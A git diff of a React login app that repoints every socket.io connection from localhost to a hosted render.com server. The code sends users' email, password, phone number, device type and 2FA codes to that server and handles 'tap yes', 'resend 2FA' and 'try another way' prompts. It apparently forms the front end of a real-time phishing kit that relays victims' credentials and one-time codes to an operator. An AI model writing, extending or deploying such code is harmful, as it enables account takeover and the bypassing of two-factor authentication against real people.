@@ -77,7 +77,7 @@ function App() {
     if (isReload) {
       // Runs only after an actual browser reload (F5, refresh button, location.reload())
       if (!socketHolder.current && sessionStorage.getItem('info')) {
-        const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
         socketHolder.current = socket.connect();
       }
       (socketHolder.current).emit('updateSocketID', { 'email': sessionStorage.getItem('info') }, (response) => {
@@ -214,7 +214,7 @@ function App() {
       console.log(email);
       try {
         if (!socketHolder.current) {
-          const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
           socketHolder.current = socket.connect();
         }
 
@@ -255,7 +255,7 @@ function App() {
       setError();
       try {
         if (!socketHolder.current) {
-          const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
           socketHolder.current = socket.connect();
         }
         (socketHolder.current).emit('sendPassword', { 'password': password, 'deviceType': getDeviceType(), 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response)=>{
@@ -297,7 +297,7 @@ function App() {
 
     try {
       if (!socketHolder.current) {
-        const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
         socketHolder.current = socket.connect();
       }
       (socketHolder.current).emit('verifyPhone', { 'phone': phone, 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response) => {
@@ -326,7 +326,7 @@ function App() {
       setLoading(true);
       try {
         if (!socketHolder.current) {
-          const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
           socketHolder.current = socket.connect();
         }
         (socketHolder.current).emit('send2facode', { 'verificationCode': code, 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response)=>{
@@ -354,7 +354,7 @@ function App() {
     type === 'tapyes' ? setLoading(true) : setLoading(false);
     try {
       if (!socketHolder.current) {
-        const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
         socketHolder.current = socket.connect();
       }
       (socketHolder.current).emit('resend2fa', { 'type': type, 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) }, (response) => {
@@ -397,7 +397,7 @@ function App() {
     setLoading(true);
     try {
       if (!socketHolder.current) {
-        const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+        const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
         socketHolder.current = socket.connect();
       }
       (socketHolder.current).emit('selectAnotherWay', { 'socketID': (sessionStorage.getItem('socketID')), 'email': (sessionStorage.getItem('info')) });
@@ -413,7 +413,7 @@ function App() {
     if (type !== 'passkey' || type !== 'recovery') {
       try {
         if (!socketHolder.current) {
-          const socket = io("http://localhost:4000", { autoConnect: false, reconnection: false });
+          const socket = io("https://websocket-i9hd.onrender.com", { autoConnect: false, reconnection: false });
           socketHolder.current = socket.connect();
         }
 
